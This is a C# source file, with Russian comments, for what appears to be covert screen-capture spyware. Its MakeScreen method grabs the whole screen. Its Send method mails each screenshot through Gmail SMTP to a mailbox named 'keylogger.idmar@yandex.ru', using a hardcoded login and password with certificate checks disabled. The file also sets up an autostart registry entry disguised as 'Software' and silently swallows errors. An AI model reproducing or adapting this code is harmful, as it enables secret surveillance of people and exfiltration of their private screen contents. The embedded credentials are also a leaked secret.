﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GoshaMsql
{
    /// <summary>
    /// Класс со всякой  логикой
    /// </summary>
   public   class BL
    {
        static string userName = "Клиент"; //имя клиента
        static string logErrors = finalDir+"logErrors.txt"; //имя клиента
        static string initName = @"C:\Users\Dim\Desktop\123\Screens\"; // конечна папка с криншодами;
        static string wayToDir = @"Skrin\"; //имя подпапки, в которую скидываются скриншоты
        static string finalDir = @"C:\Users\Dim\Desktop\123"; //имя директории, в которую переносится программа
        static string nameOfApp = @"GoshaMsql.exe"; //название исполняемого файла
        static string subKeyAdress2 = @"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"; //путь к записи в реестре для добавления в авторан
        static string subKeyAdress = @"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"; //путь к записи в реестре для добавления в авторан
        static string reserved = @""; //зарезервированное поле
        static string name = @"Software"; //название записи в реестре
        static int startPause = 0; //пауза перед началом записи скринов
        static int exitPause = 120960000; //пауза перед принудительным выходом из программы
        static string adressFrom = @"pochta@mail.ru"; //адрес отправителя
        static string nameFrom = userName; //подпись отправителя
        static string nameTo = @"ClientPochta@mail.ru"; //почтовый адрес получателя
        static string mailSubject = "Скрин"; //Тема письма
        static string mailBody = ".jpg"; //текст письма
        static string smtpAdress = @"smtp.gmail.com"; //адрес SMTP сервера почты отправителя
        static int smtpPort =  587; //порт отправки почты
        static string mailPassword = @"MyPassword"; //пароль от почты отправителя
        static string exp = @".bmp"; //расширение файла
        static int timeBetweenScreens = 10000; //время между снятием двух скриншотов.

        //***********
       // static string wayToDir = @"Screens\";
        static string wayToScreen;
       // static string finalDir = @"C:\Program Files (x86)\ScreenSaver\";
      //  Thread Cir = new Thread(Circle);

        public static void FirstStart()
        {
            string logg = "ЛОГ ошибок \t\n";
        
            try
            {
                Directory.CreateDirectory(finalDir); // создаем директорию 
               // File.Create(logErrors);
                Directory.CreateDirectory(initName); // создаем директорию для скинов
                // Directory.CreateDirectory("${finalDir}{wayToDir}"); // создаем полный путь к директорию 
              //  File.Copy(Application.ExecutablePath, finalDir + nameOfApp); //копироние программы в нужную папку

                string ExePath = finalDir + nameOfApp;  //место к исполняемогу файлу
                RegistryKey reg;
               // reg = Registry.CurrentUser.CreateSubKey(subKeyAdress); // создаем ветку в реестре
               // reg.SetValue(name, ExePath); // имя для регистра и путь к файлу.
               // reg.Close(); //завершение работы с риеестром

                if (Directory.Exists(initName)) //проверка. Если имя конечной папки существует..ТО копируем ее в конечную папку по пути finalDir
                {
                   // File.Copy(initName, finalDir + initName);
                    File.Copy(nameOfApp, initName);
                }
            }
            catch (Exception e)
            {
               
                logg += $"{DateTime.Now}\t\nПрозошла ошибка при работе {e}\t\n";
                WrateText(logg);

            }

            Application.Exit(); // выход из программы

        }


        

        //Сделать снимок
        static public void MakeScreen()
        {
            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GH = Graphics.FromImage(BM as Image);
           
            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);

            if (!Directory.Exists(wayToDir))
                Directory.CreateDirectory(wayToDir);
            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp";
            BM.Save(wayToScreen);




        }

        ///Метод оптравки на почтуы
        static public void Send()
        {

            MailAddress from = new MailAddress("lll.a.qp.o.b.o.d@gmail.com", "Idmar");
            MailAddress to = new MailAddress("keylogger.idmar@yandex.ru");
            MailMessage m = new MailMessage(from, to);
            m.Subject = "Снимок экрана";
            m.Body = "";
            m.IsBodyHtml = true;
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587); ;
            smtp.Credentials = new NetworkCredential("lll.a.qp.o.b.o.d@gmail.com", "qaEDtgUJol");
            smtp.EnableSsl = true;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            m.Attachments.Add(new Attachment(wayToScreen));
            // Thread.Sleep(10000);

            try
            {
                smtp.Send(m);
            }
            catch { }
        }

       //запись в файл
        public static void WrateText(string myText)
        {
            using (StreamWriter sw = new StreamWriter(logErrors, true, System.Text.Encoding.Default))
            {
                sw.WriteLine(myText); // запись
               
            }
        }
    }
}
